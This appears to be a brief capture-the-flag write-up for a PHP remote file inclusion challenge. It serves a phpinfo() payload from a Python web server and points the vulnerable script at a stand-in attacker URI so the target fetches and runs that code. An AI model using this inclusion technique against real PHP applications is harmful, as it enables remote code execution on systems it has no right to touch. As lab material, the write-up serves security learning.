Challenge 0 - http://hello.com/world.php

In this challenge, you must provide a URI pointing to a file containing PHP code that runs phpinfo(). We can use our own web server to achieve this. First, we write a quick PHP script:

$ mkdir evil_files
$ cat > evil_files/phpinfo.txt
<?php
phpinfo();
?>

Next, we need to serve the file. Python has a built in web server module we can use for this.

$ cd evil_files
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...

Now we just need to point our vulnerable script at our attacking system, with the following URI:

http://<attack_ip>:8000/phpinfo.txt
